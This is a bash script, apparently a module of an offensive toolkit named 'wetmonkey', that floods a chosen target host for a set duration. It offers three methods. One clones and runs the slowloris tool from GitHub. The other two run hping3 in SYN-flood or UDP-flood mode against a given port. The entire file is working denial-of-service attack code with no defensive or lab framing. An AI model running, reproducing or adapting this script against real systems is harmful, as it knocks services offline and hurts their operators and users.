#!/usr/bin/env bash
# wetmonkey ddos module â€“ multiple flood techniques
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BASE_DIR="$SCRIPT_DIR/../../"
source "$BASE_DIR/core/utils.sh"

usage(){
  cat <<EOF
Usage: $0 -t <target> [--method slowloris|syn|udp] [--port 80] [--duration 60]
Defaults: method=slowloris, port=80, duration=60s
EOF
  exit 1
}

target=""; method="slowloris"; port=80; duration=60
while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--target) target="$2"; shift 2;;
    --method) method="$2"; shift 2;;
    --port) port="$2"; shift 2;;
    --duration) duration="$2"; shift 2;;
    -h|--help) usage;;
    *) echo "Unknown arg $1"; usage;;
  esac
done
[[ -z "$target" ]] && usage
need_root
log_json "ddos_start" "target=$target method=$method port=$port duration=$duration"

case "$method" in
  slowloris)
    EXT_DIR="$BASE_DIR/external/slowloris"
    clone_if_missing https://github.com/gkbrk/slowloris.git "$EXT_DIR"
    python3 "$EXT_DIR/slowloris.py" "$target" "$port" &
    pid=$!
    sleep "$duration" && kill "$pid" 2>/dev/null || true &
    wait "$pid" || true
    ;;
  syn)
    hping3 --flood --syn -p "$port" "$target" -d 120 &
    pid=$!
    sleep "$duration" && kill "$pid" 2>/dev/null || true &
    wait "$pid" || true
    ;;
  udp)
    hping3 --flood --udp -p "$port" "$target" -d 120 &
    pid=$!
    sleep "$duration" && kill "$pid" 2>/dev/null || true &
    wait "$pid" || true
    ;;
  *) echo "Unknown method $method"; exit 1;;
esac

log_json "ddos_end" "target=$target method=$method"
